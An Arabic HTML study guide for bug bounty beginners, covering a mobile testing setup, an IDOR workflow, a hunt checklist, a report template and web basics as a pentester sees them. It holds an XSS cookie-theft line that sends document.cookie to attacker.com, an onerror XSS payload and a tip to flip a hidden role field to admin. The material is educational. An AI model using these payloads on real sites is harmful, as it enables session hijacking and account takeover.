  <div style="font-size:13px; font-weight:700; margin-bottom:12px; color:var(--accent);">📱 إعداد بيئة Bug Bounty من الموبايل</div>

  <div class="mobile-workflow">
    <div class="workflow-step">
      <div class="workflow-num">1</div>
      <div class="workflow-content">
        <div class="workflow-title">Kiwi Browser</div>
        <div class="workflow-desc">المتصفح الأساسي — يدعم Chrome Extensions على Android. استخدمه لكل شيء. يدعم DevTools الكاملة.</div>
      </div>
    </div>
    <div class="workflow-step">
      <div class="workflow-num">2</div>
      <div class="workflow-content">
        <div class="workflow-title">Tamper Dev Extension</div>
        <div class="workflow-desc">بديل Burp Suite على الموبايل. يتيح intercept وتعديل HTTP requests قبل إرسالها. ثبّته من Chrome Web Store في Kiwi.</div>
      </div>
    </div>
    <div class="workflow-step">
      <div class="workflow-num">3</div>
      <div class="workflow-content">
        <div class="workflow-title">HackBar Extension</div>
        <div class="workflow-desc">لإرسال custom requests بسرعة. مفيد لاختبار XSS, SQLi, و parameter tampering.</div>
      </div>
    </div>
    <div class="workflow-step">
      <div class="workflow-num">4</div>
      <div class="workflow-content">
        <div class="workflow-title">Cookie Editor Extension</div>
        <div class="workflow-desc">لعرض وتعديل وحذف cookies. أساسي لاختبار privilege escalation عبر cookies.</div>
      </div>
    </div>
    <div class="workflow-step">
      <div class="workflow-num">5</div>
      <div class="workflow-content">
        <div class="workflow-title">DevTools (F12 أو Menu)</div>
        <div class="workflow-desc">Network tab لرؤية كل الـ requests. Console لتشغيل JavaScript. Sources لقراءة الكود.</div>
      </div>
    </div>
    <div class="workflow-step">
      <div class="workflow-num">6</div>
      <div class="workflow-content">
        <div class="workflow-title">webhook.site</div>
        <div class="workflow-desc">للـ Out-of-Band testing: SSRF, Blind XSS, DNS lookups. مجاني وفوري.</div>
      </div>
    </div>
  </div>

  <div style="height:14px;"></div>

  <div style="font-size:12px; font-weight:700; margin-bottom:10px; color:var(--text);">🔄 Workflow الاختبار من الموبايل</div>

  <div class="vuln-card">
    <div class="vuln-header" onclick="toggleCard(this.parentElement)">
      <div class="vuln-icon" style="background:rgba(0,212,255,0.1);">🔍</div>
      <div class="vuln-meta">
        <div class="vuln-name">كيف تعترض وتعدل الـ Requests</div>
        <div class="vuln-sub">Tamper Dev خطوة بخطوة</div>
      </div>
      <span class="chevron">▼</span>
    </div>
    <div class="vuln-body">
      <div class="section-block">
        <div class="section-title">إعداد Tamper Dev</div>
        <ol class="steps-list">
          <li>في Kiwi Browser، افتح Chrome Web Store</li>
          <li>ابحث عن "Tamper Dev" وثبّته</li>
          <li>افتح Extension من القائمة العلوية</li>
          <li>فعّل "Intercept Requests"</li>
          <li>أضف الـ URL pattern: *://target.com/*</li>
        </ol>
      </div>
      <div class="section-block">
        <div class="section-title">عملية الاختبار</div>
        <div class="code-block">
          <span class="comment"># مثال: اختبار IDOR</span><br>
          <span class="key">1.</span> <span class="val">افتح profile?id=YOUR_ID</span><br>
          <span class="key">2.</span> <span class="val">Tamper Dev يعترض الـ request</span><br>
          <span class="key">3.</span> <span class="danger">غيّر id=YOUR_ID لـ id=VICTIM_ID</span><br>
          <span class="key">4.</span> <span class="val">أرسل الـ request</span><br>
          <span class="key">5.</span> <span class="val">هل رجعت بيانات ضحية أخرى؟ → IDOR!</span>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">استخدام DevTools Console للـ Requests</div>
        <div class="code-block">
          <span class="comment">// إرسال custom request من Console</span><br>
          <span class="val">fetch('/api/user/123', {</span><br>
          <span class="val">  method: 'GET',</span><br>
          <span class="val">  headers: {</span><br>
          <span class="danger">    'Authorization': 'Bearer YOUR_TOKEN',</span><br>
          <span class="val">    'Content-Type': 'application/json'</span><br>
          <span class="val">  }</span><br>
          <span class="val">}).then(r => r.json()).then(console.log)</span>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- ===== HUNT CHECKLIST TAB ===== -->
<div id="tab-hunt" class="content">

  <div style="font-size:13px; font-weight:700; margin-bottom:12px; color:var(--accent);">🎯 Bug Hunt Checklist — كل ما تختبره</div>

  <div class="hunt-grid">
    <div class="hunt-card">
      <h4>PARAMETERS</h4>
      <ul>
        <li>id, user_id</li>
        <li>role, type</li>
        <li>price, amount</li>
        <li>coupon, discount</li>
        <li>quantity, qty</li>
        <li>email, username</li>
        <li>token, key</li>
      </ul>
    </div>
    <div class="hunt-card">
      <h4>ENDPOINTS</h4>
      <ul>
        <li>/admin</li>
        <li>/dashboard</li>
        <li>/api/</li>
        <li>/internal/</li>
        <li>/config</li>
        <li>/debug</li>
        <li>/actuator/</li>
      </ul>
    </div>
    <div class="hunt-card">
      <h4>HTTP METHODS</h4>
      <ul>
        <li>GET → POST</li>
        <li>POST → PUT</li>
        <li>DELETE → GET</li>
        <li>PUT → PATCH</li>
        <li>OPTIONS</li>
        <li>HEAD</li>
      </ul>
    </div>
    <div class="hunt-card">
      <h4>BYPASS</h4>
      <ul>
        <li>X-Forwarded-For</li>
        <li>X-Real-IP</li>
        <li>X-Original-URL</li>
        <li>Content-Type</li>
        <li>Accept header</li>
        <li>Origin</li>
      </ul>
    </div>
  </div>

  <div style="height:14px;"></div>

  <div class="vuln-card">
    <div class="vuln-header" onclick="toggleCard(this.parentElement)">
      <div class="vuln-icon" style="background:rgba(0,212,255,0.1);">📋</div>
      <div class="vuln-meta">
        <div class="vuln-name">Workflow تحليل التطبيق</div>
        <div class="vuln-sub">خطوات منهجية لكل هدف جديد</div>
      </div>
      <span class="chevron">▼</span>
    </div>
    <div class="vuln-body">
      <div class="section-block">
        <div class="section-title">Recon Phase</div>
        <ol class="steps-list">
          <li>ابحث عن scope الـ program بدقة — ما المسموح اختباره</li>
          <li>استخدم DevTools Network tab لمراقبة كل الـ requests</li>
          <li>ارسم خريطة للـ features الرئيسية: login, profile, checkout, API</li>
          <li>ابحث عن JS files وقرأها — غالباً تكشف endpoints مخفية</li>
          <li>جرّب endpoints مثل: /api/docs, /swagger.json, /openapi.yaml</li>
        </ol>
      </div>
      <div class="section-block">
        <div class="section-title">Testing Phase</div>
        <ol class="steps-list">
          <li>جرّب IDOR في كل endpoint يحتوي ID</li>
          <li>اختبر Authorization: هل يمكن الوصول بدون token؟</li>
          <li>جرّب HTTP methods مختلفة على كل endpoint</li>
          <li>ابحث عن parameters في كل request وجرّب تعديلها</li>
          <li>راقب الـ error messages — قد تكشف معلومات حساسة</li>
          <li>اختبر Business Logic: ماذا يحدث بقيم غير متوقعة؟</li>
        </ol>
      </div>
    </div>
  </div>
</div>

<!-- ===== REPORT TAB ===== -->
<div id="tab-report" class="content">
  <div style="font-size:13px; font-weight:700; margin-bottom:12px; color:var(--accent);">📝 تقرير Bug Bounty احترافي</div>

  <div class="vuln-card">
    <div class="vuln-header" onclick="toggleCard(this.parentElement)">
      <div class="vuln-icon" style="background:rgba(0,212,255,0.1);">📄</div>
      <div class="vuln-meta">
        <div class="vuln-name">Template التقرير الاحترافي</div>
        <div class="vuln-sub">هيكل تقرير يقبله الـ Triage Teams</div>
      </div>
      <span class="chevron">▼</span>
    </div>
    <div class="vuln-body">
      <div class="section-block">
        <div class="report-template">
          <div class="report-label">## Title</div><br>
          <div class="report-val">[Vulnerability Type] in [Feature] allows [Impact]</div><br>
          <br>
          <div class="report-label">## Severity</div><br>
          <div class="report-val">High | CVSS 8.1</div><br>
          <br>
          <div class="report-label">## Description</div><br>
          <div class="report-val">A [vuln type] vulnerability exists in [endpoint].</div><br>
          <div class="report-val">The application fails to [validate/authorize/sanitize]...</div><br>
          <br>
          <div class="report-label">## Steps to Reproduce</div><br>
          <div class="report-val">1. Log in as user A (attacker)</div><br>
          <div class="report-val">2. Navigate to [URL]</div><br>
          <div class="report-val">3. Intercept the request using Tamper Dev</div><br>
          <div class="report-val">4. Change [parameter] from [X] to [Y]</div><br>
          <div class="report-val">5. Observe [impact]</div><br>
          <br>
          <div class="report-label">## Proof of Concept</div><br>
          <div class="report-val">[Screenshot / Video / Request-Response]</div><br>
          <br>
          <div class="report-label">## Impact</div><br>
          <div class="report-val">An attacker can [access/modify/delete] [sensitive data]</div><br>
          <div class="report-val">affecting [all users / admin / financial data].</div><br>
          <br>
          <div class="report-label">## Remediation</div><br>
          <div class="report-val">Implement server-side authorization checks to verify</div><br>
          <div class="report-val">that the requesting user owns the requested resource.</div>
        </div>
      </div>
      <div class="section-block">
        <div class="section-title">نصائح للتقرير الجيد</div>
        <div class="section-text">
          ✅ العنوان يجب أن يصف الثغرة والتأثير في جملة واحدة<br>
          ✅ الخطوات يجب أن تكون قابلة للتكرار بدقة 100%<br>
          ✅ أضف screenshot أو video دائماً كـ PoC<br>
          ✅ وضّح التأثير الحقيقي — لماذا هذا خطير؟<br>
          ✅ اقترح الإصلاح — يبيّن أنك تفهم الثغرة<br>
          ✅ لا تبالغ في الـ Severity — هذا يضر سمعتك
        </div>
      </div>
    </div>
  </div>

  <div style="height:14px;"></div>

  <div class="vuln-card">
    <div class="vuln-header" onclick="toggleCard(this.parentElement)">
      <div class="vuln-icon" style="background:rgba(57,255,20,0.1);">🏆</div>
      <div class="vuln-meta">
        <div class="vuln-name">خارطة طريق الـ First Bug Bounty</div>
        <div class="vuln-sub">من الصفر للمكافأة الأولى</div>
      </div>
      <span class="chevron">▼</span>
    </div>
    <div class="vuln-body">
      <div class="section-block">
        <div class="section-title">الشهر الأول — الأساسيات</div>
        <ol class="steps-list">
          <li>أكمل جميع Apprentice Labs في PortSwigger (Access Control + Auth + Business Logic)</li>
          <li>ابدأ Practitioner Labs في Access Control و Business Logic</li>
          <li>اقرأ 20 تقرير Bug Bounty من HackerOne Hacktivity</li>
        </ol>
      </div>
      <div class="section-block">
        <div class="section-title">الشهر الثاني — XSS + CSRF + API</div>
        <ol class="steps-list">
          <li>أكمل XSS Labs (Reflected + Stored + DOM)</li>
          <li>أكمل CSRF Labs</li>
          <li>ابدأ API Security Labs</li>
          <li>جرّب برامج VDP (Vulnerability Disclosure) مجانية: HackerOne Free Programs</li>
        </ol>
      </div>
      <div class="section-block">
        <div class="section-title">الشهر الثالث — الصيد الحقيقي</div>
        <ol class="steps-list">
          <li>اختر برنامج Bug Bounty عام في HackerOne أو Bugcrowd</li>
          <li>ابدأ بـ IDOR وـ Access Control (قوتك الحالية)</li>
          <li>افحص كل endpoint بمنهجية</li>
          <li>أرسل أول تقرير — حتى لو كان N/A، ستتعلم</li>
        </ol>
      </div>
      <div class="section-block">
        <div class="section-title">برامج مناسبة للمبتدئين</div>
        <a href="https://hackerone.com/programs?query=type%3Apublic" target="_blank" class="resource-link">
          <span class="link-icon">💰</span> HackerOne Public Programs
        </a>
        <a href="https://bugcrowd.com/programs" target="_blank" class="resource-link">
          <span class="link-icon">🐛</span> Bugcrowd Programs
        </a>
        <a href="https://www.intigriti.com/programs" target="_blank" class="resource-link">
          <span class="link-icon">🎯</span> Intigriti Programs
        </a>
      </div>
    </div>
  </div>
</div>

<button class="fab" onclick="resetProgress()">🔄 تحديث التقدم</button>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js">

function switchTab(name) {
  document.querySelectorAll('.tab').forEach((t,i) => t.classList.remove('active'));
  document.querySelectorAll('.content').forEach(c => c.classList.remove('active'));
  
  const tabs = document.querySelectorAll('.tab');
  const tabNames = ['map','xss','csrf','ssrf','api','race','upload','mobile','hunt','report'];
  const idx = tabNames.indexOf(name);
  if(idx >= 0) tabs[idx].classList.add('active');
  
  const el = document.getElementById('tab-'+name);
  if(el) el.classList.add('active');
}

function toggleCard(card) {
  card.classList.toggle('open');
}

// Count checked items & update progress
function updateProgress() {
  const all = document.querySelectorAll('.check-item input[type="checkbox"]');
  const done = document.querySelectorAll('.check-item input[type="checkbox"]:checked');
  const base = 35;
  const extra = Math.round((done.length / Math.max(all.length, 1)) * 20);
  const pct = Math.min(base + extra, 100);
  document.getElementById('pct'
</div>

<!-- ═══ REFERENCE PAGE ═══ -->
<div id="page-reference" class="page">
<div class="hdr">
  <h1>🔐 مرجع الويب <span>للـ Pentester</span></h1>
  <div class="nav">
    <button class="nb a" data-t="html" onclick="sw('html',this)">🟠 HTML</button>
    <button class="nb" data-t="css" onclick="sw('css',this)">🔵 CSS</button>
    <button class="nb" data-t="js" onclick="sw('js',this)">🟡 JavaScript</button>
    <button class="nb" data-t="http" onclick="sw('http',this)">🟢 HTTP</button>
    <button class="nb" data-t="php" onclick="sw('php',this)">🟣 PHP</button>
    <button class="nb" data-t="mysql" onclick="sw('mysql',this)">🔷 MySQL</button>
  </div>
</div>
<div class="pg">

<!-- HTML -->
<div class="tp a" id="html">
  <div class="th"><div class="ti">🟠</div><div><div class="tt">HTML</div><div class="td">هيكل الصفحة - أساس كل موقع</div></div></div>
  <div class="sc"><div class="st">📌 HTML إيه؟</div><div class="sb">
    <p>HTML بتبني <b>هيكل الصفحة</b>. مش لغة برمجة، هي لغة وصف. كل حاجة في المتصفح هي HTML في الأساس.</p>
    <div class="cb"><div class="ch"><span>مثال أساسي</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="tg">&lt;h1&gt;</span>عنوان كبير<span class="tg">&lt;/h1&gt;</span>
<span class="tg">&lt;p&gt;</span>فقرة نص<span class="tg">&lt;/p&gt;</span>
<span class="tg">&lt;a</span> <span class="at">href</span>=<span class="str">"https://example.com"</span><span class="tg">&gt;</span>رابط<span class="tg">&lt;/a&gt;</span>
<span class="tg">&lt;img</span> <span class="at">src</span>=<span class="str">"photo.jpg"</span> <span class="at">alt</span>=<span class="str">"صورة"</span><span class="tg">&gt;</span></pre></div>
  </div></div>

  <div class="sc"><div class="st">🏗️ هيكل أي صفحة HTML</div><div class="sb">
    <div class="cb"><div class="ch"><span>skeleton.html</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="tg">&lt;!DOCTYPE html&gt;</span>         <span class="cm">&lt;!-- نوع الملف --&gt;</span>
<span class="tg">&lt;html&gt;</span>
  <span class="tg">&lt;head&gt;</span>                <span class="cm">&lt;!-- معلومات خفية --&gt;</span>
    <span class="tg">&lt;meta</span> <span class="at">charset</span>=<span class="str">"UTF-8"</span><span class="tg">&gt;</span>
    <span class="tg">&lt;title&gt;</span>اسم الصفحة<span class="tg">&lt;/title&gt;</span>
  <span class="tg">&lt;/head&gt;</span>
  <span class="tg">&lt;body&gt;</span>                <span class="cm">&lt;!-- المحتوى الظاهر --&gt;</span>
    <span class="tg">&lt;h1&gt;</span>مرحبا<span class="tg">&lt;/h1&gt;</span>
  <span class="tg">&lt;/body&gt;</span>
<span class="tg">&lt;/html&gt;</span></pre></div>
    <div class="tb"><strong>💡 قاعدة</strong>head = مخفي عن المستخدم | body = ظاهر للمستخدم</div>
  </div></div>

  <div class="sc"><div class="st">📋 Forms - الأهم في Pentesting</div><div class="sb">
    <p>الـ Form بتبعت البيانات للسيرفر، وهي <b>نقطة الهجوم الأولى</b> في أي موقع.</p>
    <div class="cb"><div class="ch"><span>form.html</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="tg">&lt;form</span> <span class="at">method</span>=<span class="str">"POST"</span> <span class="at">action</span>=<span class="str">"/login"</span><span class="tg">&gt;</span>
  <span class="cm">&lt;!-- نص عادي --&gt;</span>
  <span class="tg">&lt;input</span> <span class="at">type</span>=<span class="str">"text"</span>     <span class="at">name</span>=<span class="str">"username"</span><span class="tg">&gt;</span>
  <span class="cm">&lt;!-- باسورد --&gt;</span>
  <span class="tg">&lt;input</span> <span class="at">type</span>=<span class="str">"password"</span> <span class="at">name</span>=<span class="str">"pass"</span><span class="tg">&gt;</span>
  <span class="cm">&lt;!-- مخفي - خطير في Pentesting! --&gt;</span>
  <span class="tg">&lt;input</span> <span class="at">type</span>=<span class="str">"hidden"</span>   <span class="at">name</span>=<span class="str">"role"</span> <span class="at">value</span>=<span class="str">"user"</span><span class="tg">&gt;</span>
  <span class="tg">&lt;button</span> <span class="at">type</span>=<span class="str">"submit"</span><span class="tg">&gt;</span>دخول<span class="tg">&lt;/button&gt;</span>
<span class="tg">&lt;/form&gt;</span></pre></div>
    <div class="pb"><strong>🎯 Hidden Fields</strong>بتظهر في Source Code وفي Burp Suite. غير role=user لـ role=admin وشوف إيه اللي هيحصل!</div>
  </div></div>

  <div class="sc"><div class="st">🔑 Attributes الأهم</div><div class="sb">
    <table>
      <tr><th>Attribute</th><th>الوظيفة</th><th>أهمية في Pentest</th></tr>
      <tr><td><b>name</b></td><td>اسم البيانات المبعوتة</td><td>🔴 عالية - ده اللي في Burp</td></tr>
      <tr><td><b>action</b></td><td>الصفحة المستقبِلة</td><td>🔴 عالية - endpoint للهجوم</td></tr>
      <tr><td><b>method</b></td><td>GET أو POST</td><td>🟡 متوسطة</td></tr>
      <tr><td><b>value</b></td><td>القيمة الافتراضية</td><td>🔴 مهم في hidden fields</td></tr>
    </table>
  </div></div>

  <div class="sc"><div class="st">👁️ View Source - سلاحك الأول</div><div class="sb">
    <p>في المتصفح اضغط <b>Ctrl+U</b> وشوف الـ HTML كله. اللي بتدور عليه:</p>
    <ul>
      <li>Hidden fields فيها بيانات حساسة</li>
      <li>Comments فيها معلومات مهمة</li>
      <li>API endpoints أو روابط مخفية</li>
    </ul>
    <div class="cb"><div class="ch"><span>مثال comment خطير</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="cm">&lt;!-- TODO: remove /admin-secret-panel --&gt;</span>
<span class="cm">&lt;!-- DB: mysql://localhost/users_db --&gt;</span></pre></div>
    <div class="pb"><strong>🎯 Pentest Note</strong>المطورين بيحطوا comments بتكشف معلومات خطيرة. دايماً افحص الـ Source Code!</div>
  </div></div>
</div>

<!-- CSS -->
<div class="tp" id="css">
  <div class="th"><div class="ti">🔵</div><div><div class="tt">CSS</div><div class="td">التصميم والشكل</div></div></div>
  <div class="sc"><div class="st">📌 CSS إيه؟</div><div class="sb">
    <p>CSS بتحدد <b>شكل وتصميم</b> الـ HTML. كل قاعدة فيها: Selector + Property + Value</p>
    <div class="cb"><div class="ch"><span>القاعدة الأساسية</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="cm">/* selector  { property:  value;  } */</span>
<span class="nm">h1</span>          { <span class="at">color</span>:      <span class="str">red</span>;   }
<span class="nm">.my-class</span>   { <span class="at">background</span>: <span class="str">blue</span>;  }
<span class="nm">#my-id</span>      { <span class="at">font-size</span>:  <span class="str">20px</span>; }</pre></div>
  </div></div>

  <div class="sc"><div class="st">🎯 الـ 3 Selectors الأساسيين</div><div class="sb">
    <div class="cb"><div class="ch"><span>selectors.css</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="cm">/* 1. باسم العنصر - بيأثر على الكل */</span>
<span class="nm">p</span> { <span class="at">color</span>: <span class="str">gray</span>; }

<span class="cm">/* 2. بالـ Class - نقطة قبل الاسم */</span>
<span class="nm">.login-box</span> {
  <span class="at">background</span>: <span class="str">white</span>;
  <span class="at">padding</span>: <span class="str">20px</span>;
}

<span class="cm">/* 3. بالـ ID - هاش قبل الاسم */</span>
<span class="nm">#submit-btn</span> {
  <span class="at">background</span>: <span class="str">green</span>;
  <span class="at">color</span>: <span class="str">white</span>;
}</pre></div>
    <div class="tb"><strong>💡 الفرق</strong>Class ممكن تتكرر في عناصر كتير | ID لازم يكون فريد في الصفحة كلها</div>
  </div></div>

  <div class="sc"><div class="st">📦 Box Model</div><div class="sb">
    <div class="cb"><div class="ch"><span>box-model.css</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="nm">.box</span> {
  <span class="at">margin</span>:  <span class="str">10px</span>;         <span class="cm">/* مسافة خارجية */</span>
  <span class="at">border</span>:  <span class="str">2px solid #333</span>;<span class="cm">/* الإطار */</span>
  <span class="at">padding</span>: <span class="str">20px</span>;         <span class="cm">/* مسافة داخلية */</span>
  <span class="at">width</span>:   <span class="str">200px</span>;        <span class="cm">/* عرض المحتوى */</span>
}</pre></div>
  </div></div>

  <div class="sc"><div class="st">🔐 CSS في Pentesting</div><div class="sb">
    <div class="pb"><strong>🎯 Hidden Elements</strong>بعض المواقع بتخبي عناصر بـ display:none أو visibility:hidden، بس هي موجودة في الـ HTML وممكن تتفاعل معاها من Burp!</div>
    <div class="pb"><strong>🎯 CSS Injection</strong>لو موقع بيسمح بإدخال CSS من المستخدم، ممكن تسرق CSRF tokens بـ attribute selectors!</div>
  </div></div>
</div>

<!-- JS -->
<div class="tp" id="js">
  <div class="th"><div class="ti">🟡</div><div><div class="tt">JavaScript</div><div class="td">الأهم في Pentesting - سلاحك الرئيسي</div></div></div>
  <div class="sc"><div class="st">📌 JS إيه؟</div><div class="sb">
    <p>JS هي لغة البرمجة الوحيدة اللي بتشتغل <b>في المتصفح</b>. بتتحكم في كل حاجة بتتحرك أو بتتغير.</p>
    <p>في Pentesting: <b>XSS = حقن JS في موقع تاني = سرقة cookies وحسابات</b></p>
  </div></div>

  <div class="sc"><div class="st">🔤 المتغيرات</div><div class="sb">
    <div class="cb"><div class="ch"><span>variables.js</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="kw">let</span>   name    = <span class="str">"Ahmed"</span>; <span class="cm">// نص</span>
<span class="kw">let</span>   age     = <span class="nm">25</span>;      <span class="cm">// رقم</span>
<span class="kw">let</span>   isAdmin = <span class="kw">false</span>;  <span class="cm">// true/false</span>
<span class="kw">const</span> PI      = <span class="nm">3.14</span>;   <span class="cm">// ثابت مش بيتغير</span>

console.<span class="fn">log</span>(name);       <span class="cm">// طباعة في Console</span></pre></div>
  </div></div>

  <div class="sc"><div class="st">⚙️ Functions</div><div class="sb">
    <div class="cb"><div class="ch"><span>functions.js</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="kw">function</span> <span class="fn">checkLogin</span>(user, pass) {
  <span class="kw">if</span> (user === <span class="str">"admin"</span> && pass === <span class="str">"1234"</span>) {
    <span class="kw">return</span> <span class="str">"مرحبا ادمن!"</span>;
  } <span class="kw">else</span> {
    <span class="kw">return</span> <span class="str">"خطأ في البيانات"</span>;
  }
}
console.<span class="fn">log</span>(<span class="fn">checkLogin</span>(<span class="str">"admin"</span>, <span class="str">"1234"</span>));</pre></div>
    <div class="pb"><strong>🎯 Client-Side Check</strong>بعض المواقع بتعمل validation في JS فقط. في Burp ابعت البيانات مباشرة للسيرفر وتجاوز الـ JS كلها!</div>
  </div></div>

  <div class="sc"><div class="st">🌐 DOM - التحكم في الصفحة</div><div class="sb">
    <div class="cb"><div class="ch"><span>dom.js</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="cm">// جيب عنصر</span>
<span class="kw">let</span> el = document.<span class="fn">getElementById</span>(<span class="str">"myId"</span>);
<span class="kw">let</span> el = document.<span class="fn">querySelector</span>(<span class="str">".myClass"</span>);

<span class="cm">// اقرأ قيمة input</span>
<span class="kw">let</span> val = document.<span class="fn">querySelector</span>(<span class="str">'[name="user"]'</span>).value;

<span class="cm">// ❌ خطير - هنا بتحصل XSS!</span>
document.<span class="fn">getElementById</span>(<span class="str">"x"</span>).innerHTML = userInput;

<span class="cm">// ✅ آمن</span>
document.<span class="fn">getElementById</span>(<span class="str">"x"</span>).textContent = userInput;</pre></div>
    <div class="pb"><strong>🎯 innerHTML = XSS</strong>لو موقع بيعمل innerHTML بإدخال المستخدم بدون تنظيف، ابعت: &lt;img src=x onerror=alert(document.cookie)&gt;</div>
  </div></div>

  <div class="sc"><div class="st">📡 Fetch - طلبات في الخلفية</div><div class="sb">
    <div class="cb"><div class="ch"><span>fetch.js</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="cm">// GET request</span>
<span class="fn">fetch</span>(<span class="str">"/api/users"</span>)
  .<span class="fn">then</span>(r => r.<span class="fn">json</span>())
  .<span class="fn">then</span>(data => console.<span class="fn">log</span>(data));

<span class="cm">// POST request</span>
<span class="fn">fetch</span>(<span class="str">"/api/login"</span>, {
  method: <span class="str">"POST"</span>,
  body: <span class="nm">JSON</span>.<span class="fn">stringify</span>({user:<span class="str">"admin"</span>, pass:<span class="str">"123"</span>}),
  headers: {<span class="str">"Content-Type"</span>: <span class="str">"application/json"</span>}
});</pre></div>
    <div class="pb"><strong>🎯 API Endpoints</strong>في DevTools تبويب Network هتشوف كل الـ fetch requests. دي endpoints ممكن تكون غير محمية!</div>
  </div></div>

  <div class="sc"><div class="st">🍪 Cookies و Storage</div><div class="sb">
    <div class="cb"><div class="ch"><span>storage.js</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="cm">// اقرأ الـ Cookies</span>
console.<span class="fn">log</span>(document.cookie);

<span class="cm">// اقرأ localStorage</span>
console.<span class="fn">log</span>(localStorage.<span class="fn">getItem</span>(<span class="str">"token"</span>));

<span class="cm">// XSS + Cookie Theft</span>
<span class="kw">new</span> <span class="fn">Image</span>().src =
  <span class="str">"https://attacker.com/?c="</span> + document.cookie;</pre></div>
    <div class="pb"><strong>🎯 Session Hijacking</strong>لو XSS نجح، سرقة الـ Cookie = دخول على الحساب بدون باسورد!</div>
  </div></div>
</div>

<!-- HTTP -->
<div class="tp" id="http">
  <div class="th"><div class="ti">🟢</div><div><div class="tt">HTTP & Requests</div><div class="td">لغة الإنترنت - الأساس اللي لازم تفهمه</div></div></div>
  <div class="sc"><div class="st">📌 HTTP إيه؟</div><div class="sb">
    <p>HTTP هو البروتوكول اللي المتصفح والسيرفر بيتكلموا بيه. كل حاجة بتعملها = <b>Request</b> والسيرفر بيرد بـ <b>Response</b>. الـ Pentester بيشوف ويعدل في الـ Requests دي باستخدام Burp Suite.</p>
  </div></div>

  <div class="sc"><div class="st">📤 شكل الـ HTTP Request</div><div class="sb">
    <div class="cb"><div class="ch"><span>HTTP Request كامل</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="tg">POST</span> /login <span class="nm">HTTP/1.1</span>            <span class="cm">← Method + Path</span>
<span class="at">Host:</span> example.com                <span class="cm">← اسم الموقع</span>
<span class="at">Content-Type:</span> application/x-www-form-urlencoded
<span class="at">Cookie:</span> session=abc123           <span class="cm">← Session Token</span>
<span class="at">User-Agent:</span> Mozilla/5.0
                                  <span class="cm">← سطر فاضي فاصل</span>
<span class="str">username=admin&password=1234</span>     <span class="cm">← Body البيانات</span></pre></div>
  </div></div>

  <div class="sc"><div class="st">📥 شكل الـ HTTP Response</div><div class="sb">
    <div class="cb"><div class="ch"><span>HTTP Response كامل</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="nm">HTTP/1.1</span> <span class="tg">200 OK</span>                  <span class="cm">← Status Code</span>
<span class="at">Content-Type:</span> text/html
<span class="at">Set-Cookie:</span> session=xyz; HttpOnly <span class="cm">← بيحط Cookie</span>
<span class="at">Server:</span> Apache/2.4               <span class="cm">← نوع السيرفر</span>

<span class="str">&lt;html&gt;مرحبا بك!&lt;/html&gt;</span>          <span class="cm">← الـ Body</span></pre></div>
  </div></div>

  <div class="sc"><div class="st">🔢 Status Codes</div><div class="sb">
    <table>
      <tr><th>Code</th><th>المعنى</th><th>في Pentesting</th></tr>
      <tr><td><span class="bx b2">200 OK</span></td><td>تمام</td><td>الطلب نجح</td></tr>
      <tr><td><span class="bx b3">301 Redirect</span></td><td>انتقال دائم</td><td>يكشف structure</td></tr>
      <tr><td><span class="bx b4">401 Unauthorized</span></td><td>محتاج login</td><td>يوجد authentication</td></tr>
      <tr><td><span class="bx b5">403 Forbidden</span></td><td>ممنوع الدخول</td><td>🔴 الصفحة موجودة!</td></tr>
      <tr><td><span class="bx b5">404 Not Found</span></td><td>مش موجود</td><td>الصفحة مش موجودة</td></tr>
      <tr><td><span class="bx b5">500 Server Error</span></td><td>خطأ في السيرفر</td><td>🔴 ممكن يكشف stack trace!</td></tr>
    </table>
    <div class="pb"><strong>🎯 403 vs 404</strong>404 = مش موجود. 403 = موجودة بس محظورة! لو شفت 403 يعني الصفحة موجودة وممكن تحاول تتجاوز الحماية.</div>
  </div></div>

  <div class="sc"><div class="st">🔑 Headers المهمة</div><div class="sb">
    <table>
      <tr><th>Header</th><th>الوظيفة</th><th>أهمية</th></tr>
      <tr><td><b>Cookie</b></td><td>Session token</td><td>🔴 سرقته = سرقة الحساب</td></tr>
      <tr><td><b>Authorization</b></td><td>Bearer/JWT token</td><td>🔴 مهم جداً</td></tr>
      <tr><td><b>Content-Type</b></td><td>نوع البيانات</td><td>🟡 تغييره يكسر validation</td></tr>
      <tr><td><b>X-Forwarded-For</b></td><td>IP المستخدم</td><td>🟡 ممكن تتلاعب فيه</td></tr>
      <tr><td><b>Server</b></td><td>نوع السيرفر</td><td>🟢 يكشف التكنولوجيا</td></tr>
    </table>
  </div></div>

  <div class="sc"><div class="st">⚡ GET vs POST</div><div class="sb">
    <div class="cb"><div class="ch"><span>الفرق العملي</span><button class="cp" onclick="cp(this)">نسخ</button></div>
<pre><span class="cm">// GET - البيانات في الـ URL (ظاهرة!)</span>
https://example.com/search<span class="tg">?q=hello&page=2</span>

<span class="cm">// POST - البيانات في الـ Body (مخفية)</span>
<span class="tg">POST</span> /login
<span class="str">username=admin&password=1234</span></pre></div>
    <div class="pb"><strong>🎯 Pentest Note</strong>GET = عدّل في الـ URL مباشرة. POST = محتاج Burp Suite تعدل في الـ Body.</div>
  </div></div>
</div>

<!-- PHP -->
<div class="tp" id="php">
  <div class="th"><div class="ti">🟣</div><div><div class="tt">PHP</div><div class="td">الباك إند - بيشتغل على السيرفر</div></div></div>
  <div class="sc"><div class="st">📌 PHP إيه؟</div><div class="sb">
    <p>PHP بتشتغل على <b>السيرفر</b>، المستخدم مش بيشوفها. بتستقبل البيانات من الـ Form وبتتعامل معاها.</p>
    <div class="cb"><div class="ch"><span>أول كود PHP</span><button class="cp" onclick="cp(this)">نسخ</button></div>
